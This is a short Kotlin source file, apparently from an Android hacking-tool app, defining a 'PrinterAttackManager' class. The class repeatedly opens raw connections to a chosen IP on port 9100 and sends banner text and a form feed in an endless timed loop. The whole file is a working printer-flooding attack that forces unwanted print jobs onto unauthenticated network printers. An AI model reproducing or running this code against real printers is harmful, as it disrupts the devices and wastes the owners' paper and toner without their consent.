package com.example.bruceir

import android.os.Handler
import android.os.Looper
import android.util.Log
import java.io.PrintWriter
import java.net.Socket

class PrinterAttackManager {

    private var isRunning = false
    private val handler = Handler(Looper.getMainLooper())

    fun startAttack(ip: String, text: String, delaySeconds: Int) {
        if (isRunning) return
        isRunning = true

        Thread {
            while (isRunning) {
                try {
                    val socket = Socket(ip, 9100) // Port RAW/AppSocket
                    socket.soTimeout = 5000
                    val writer = PrintWriter(socket.getOutputStream(), true)
                    
                    // Simple RAW text print command
                    writer.println("\n\n")
                    writer.println("********************************")
                    writer.println("*                              *")
                    writer.println("*           $text              *")
                    writer.println("*                              *")
                    writer.println("********************************")
                    writer.println("\n\n\n")
                    
                    // Standard Form Feed (FF) char to eject page
                    writer.write(0x0C) 
                    writer.flush()
                    
                    writer.close()
                    socket.close()
                    Log.d("BruceIR", "Printer job sent to $ip")
                } catch (e: Exception) {
                    Log.e("BruceIR", "Printer Attack Error: ${e.message}")
                }
                
                if (!isRunning) break
                Thread.sleep(delaySeconds * 1000L)
            }
        }.start()
    }

    fun stopAttack() {
        isRunning = false
    }
}
